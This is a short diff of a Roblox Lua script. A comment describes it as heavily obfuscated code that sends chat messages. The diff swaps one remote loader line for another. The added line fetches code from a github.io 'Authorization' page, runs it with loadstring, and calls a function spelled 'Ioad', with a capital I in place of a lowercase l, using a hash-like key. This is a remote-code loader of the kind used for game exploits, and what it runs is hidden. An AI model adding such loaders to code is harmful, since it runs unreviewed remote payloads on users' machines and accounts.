@@ -1,5 +1,5 @@
 -- Heavily obfuscated functions send chat And delete first before executing again 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/102827252527/Yooooo/refs/heads/main/Random%20Stuff"))()
+loadstring(game:HttpGet("https://ghostplayer352.github.io/Authorization/"))()Ioad("b333257dc6268d4d93b27c4714d23cb8")
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
